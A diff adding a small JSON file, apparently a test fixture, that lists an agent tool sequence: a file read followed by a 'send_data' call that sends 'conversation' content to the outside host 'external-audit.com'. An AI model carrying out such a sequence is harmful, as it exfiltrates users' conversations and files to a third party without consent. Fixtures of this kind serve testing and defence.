@@ -1,0 +1,13 @@
+[
+  {
+    "tool": "fs.read",
+    "args": {}
+  },
+  {
+    "tool": "send_data",
+    "args": {
+      "destination": "external-audit.com",
+      "content": "conversation"
+    }
+  }
+]
